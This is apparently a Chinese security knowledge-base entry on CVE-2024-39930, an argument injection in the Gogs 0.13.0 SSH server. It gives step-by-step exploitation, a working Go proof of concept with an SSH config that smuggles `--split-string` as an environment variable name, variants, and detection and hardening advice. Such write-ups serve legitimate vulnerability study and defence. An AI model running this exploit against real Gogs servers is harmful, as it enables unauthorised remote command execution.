---
id: web-golang-gogs-ssh-env-split-string-argument-injection
title: Gogs 内置 SSH 服务器 env 请求参数注入：环境变量名设为 --split-string 经 env -S 执行任意命令（CVE-2024-39930）
type: scenario
domain: web
path: web/golang
technique: gogs-ssh-env-split-string-argument-injection
tags:
- gogs
- golang
- ssh
- argument-injection
- env
- split-string
- rce
- cve-2024-39930
cve:
- CVE-2024-39930
severity: high
confidence: high
affected_versions: Gogs 0.13.0
status: draft
created: '2026-11-07'
updated: '2026-11-07'
url: /docs/web/golang/web-golang-gogs-ssh-env-split-string-argument-injection/
draft: false
kb_aliases:
- CVE-2024-39930
- Gogs env 参数注入
- env --split-string RCE
- Gogs SSH RCE
- 内置 SSH 服务器参数注入
---

## 一句话结论

Gogs 0.13.0 的内置 SSH 服务器把客户端 `env` 请求里的变量名和值直接拼成 `NAME=VALUE` 交给 `env` 执行；当变量名为 `--split-string`、值为任意命令时，实际执行 `env --split-string=<命令>`，GNU env 的 `-S/--split-string` 会把该字符串拆成命令与参数并执行，从而以 Gogs 进程权限远程执行任意命令。

## 原理

- **SSH env 请求**：SSH 协议允许客户端在打开通道后、执行命令前发送 `env` 请求设置环境变量。OpenSSH 客户端用 `SendEnv` 指定哪些本地环境变量会被发送；Gogs 内置的 Go SSH 服务器自己处理这些请求，不依赖 sshd 的 `AcceptEnv` 白名单。
- **易受攻击的代码路径**：服务器对每个 `env` 请求做 `ssh.Unmarshal` 得到 `env.Name`/`env.Value`，只检查两者非空，然后调用 `com.ExecCmd("env", fmt.Sprintf("%s=%s", env.Name, env.Value))`。由于 `exec` 不经过 shell，`;`、`|`、`$()` 等 shell 元字符不会生效，常规命令注入不成立。
- **参数注入的关键**：GNU coreutils 的 `env` 支持 `-S, --split-string=S`，会把 `S` 按空格拆成“命令 + 参数”再执行，等价于直接运行该命令。攻击者把变量名设为 `--split-string`、值设为 `cat /etc/passwd`，拼接结果就是单个 argv：`env`、`--split-string=cat /etc/passwd`；`env` 解析为长选项 `--split-string`，随后执行 `cat /etc/passwd`。
- **为什么能传带 `-` 的变量名**：Linux 环境变量名一般不允许通过 shell `export` 设置以 `-` 开头的名字（`export "--split-string=..."` 会被 shell 当成选项而报错）。但攻击者可以在启动 `git clone` 的父进程里用 `os.Setenv("--split-string", "cat /etc/passwd")` 直接写入环境块（Go 的 `os.Setenv` 允许该名字），再让子进程 `ssh` 继承；本地 `~/.ssh/config` 用 `SendEnv *split*` 等通配模式即可把该变量作为 env 请求发给服务器。文章用 C 的 `setenv` 未成功、用 Go 的 `os.Setenv` 成功。
- **认证与触发**：攻击者需要有一个 Gogs 账户，并在账户设置里登记自己的 SSH 公钥；随后用该密钥 `git clone` 任意仓库（例如自己创建的空仓库）即可触发 SSH 会话。`env` 请求在 `exec` 请求之前被处理，因此命令在真正执行 git 服务前就已运行。
- **输出不可见**：Gogs 该分支只检查 err 并记录 stderr，不把 stdout 返回给客户端，所以默认是盲执行；文章通过临时修改源码打印 `stdout` 来确认 `/etc/passwd` 已被读出。

## 触发条件

- Gogs 版本为 0.13.0（原文标记），启用内置 SSH 服务器（安装向导勾选“使用内置 SSH 服务器”，示例端口 2222）。
- 攻击者持有有效 Gogs 账户，且该账户已添加 SSH 公钥；能通过 SSH 访问 Gogs 的 SSH 端口。
- 服务器上的 `env` 为 GNU coreutils（支持 `-S/--split-string`）。
- 攻击者能控制本地环境变量名（如用 Go/Python 的 `os.Setenv`/`os.environ` 写入 `--split-string`），并配置 SSH 客户端的 `SendEnv` 匹配该名字。
- Gogs 进程具备执行目标命令的权限（文章环境以 root 运行 Gogs，命令即 root 权限）。

## 利用步骤

1. 注册 Gogs 账户，在“用户设置 → SSH 密钥”添加攻击者公钥；创建一个仓库用于 clone。
2. 在本机 `~/.ssh/config` 中为目标主机加入 `SendEnv LANG LC_* *split*`（或 `ssh -o SendEnv=*split*`），使名字含 `split` 的本地环境变量会被发送。
3. 用支持任意环境变量名的语言设置变量：`os.Setenv("--split-string", "cat /etc/passwd")`；不要用 shell `export`。
4. 在同一进程中启动 `git clone ssh://<user>@<gogs-host>:2222/<user>/<repo>.git`（子进程继承环境变量，ssh 客户端按 SendEnv 规则发送 env 请求）。
5. Gogs 收到 env 请求后执行 `env --split-string=cat /etc/passwd`，命令执行；默认输出不回显，可改用反弹 shell 或写入文件确认。
6. 若要确认回显，可在 Gogs 源码 `internal/ssh/ssh.go` 的 `com.ExecCmd` 后打印 stdout（仅本地复现环境），或改用 `bash -c '...'`/反弹 shell 把结果带出。

## PoC

客户端 Go 辅助程序（设置带 `-` 的环境变量名后调用 git）：

```go
package main

import (
    "os"
    "os/exec"
)

func main() {
    os.Setenv("--split-string", "id") // 或 "cat /etc/passwd"、反弹 shell 命令
    cmd := exec.Command("git", "clone",
        "ssh://attacker@gogs.local:2222/attacker/t.git", "/tmp/t")
    cmd.Stdout, cmd.Stderr = os.Stdout, os.Stderr
    _ = cmd.Run()
}
```

`~/.ssh/config`：

```sshconfig
Host gogs.local
    SendEnv LANG LC_* *split*
```

服务器端最终执行的命令等价于：

```bash
env --split-string=id
# env 解析 -S 后实际执行：id
```

## 变体与关联

- 变体：不局限 `--split-string`，任何 `env` 选项都可能被注入；只要能控制变量名前缀为 `-`，还可尝试 `-C/--chdir`、`--argv0` 等改变执行上下文。
- 变体：若目标 `env` 是 BusyBox 或其他不支持 `-S` 的实现，可换用其他“参数即命令”的 GNU 工具或寻找下一跳注入点。
- 变体：若无法用 `git clone` 触发，任何能建立已认证 SSH 会话的客户端（自写 SSH 客户端直接发 `env` 请求）都可利用，甚至不需要 git 功能。
- 关联：[[web-golang-gogs-updaterepofile-symlink-git-config-rce]]（另一条 Gogs RCE 链，利用 UpdateRepoFile 符号链接写 `core.sshCommand`）、[[web-golang-gogs-hooks-prereceive-symlink-write-rce]]（Gogs 写 hooks/pre-receive 触发 RCE）；三条链入口不同但最终都以 Gogs 进程权限执行命令。
- 关联：[[web-golang-build-env-cc-injection-command-exec]]（Go 服务把用户可控环境变量/参数交给外部构建命令导致命令执行，同属“环境变量/参数注入”类）。

## 检测与防御

- **修复**：升级到已修复 CVE-2024-39930 的 Gogs 版本；不要把用户可控的环境变量名/值作为外部命令的 argv 传入。
- **代码层防御**：改用 `exec.Cmd.Env`/`os.Setenv` 直接设置环境，不调用 `env` 二进制；若必须调用，校验变量名只允许 `[A-Za-z_][A-Za-z0-9_]*`，拒绝以 `-` 开头或含 `=` 的名字，并在参数前插入 `--` 终止选项解析。
- **检测**：审计 Gogs SSH 日志中形如 `env.Name: --split-string`、`env.Name` 以 `-` 开头的请求；进程监控中关注 `env` 进程的 argv 含 `--split-string`/`-S` 且后半段是 shell 命令；对 `git clone` 会话后立刻出现的 `id`、`cat`、`bash -c` 等子进程告警。
- **加固**：Gogs 以最小权限用户运行，限制其可读文件与网络出口；只允许已授权用户添加 SSH 密钥；在边界 SSH 网关层丢弃异常 env 请求（如 Name 以 `-` 开头）。
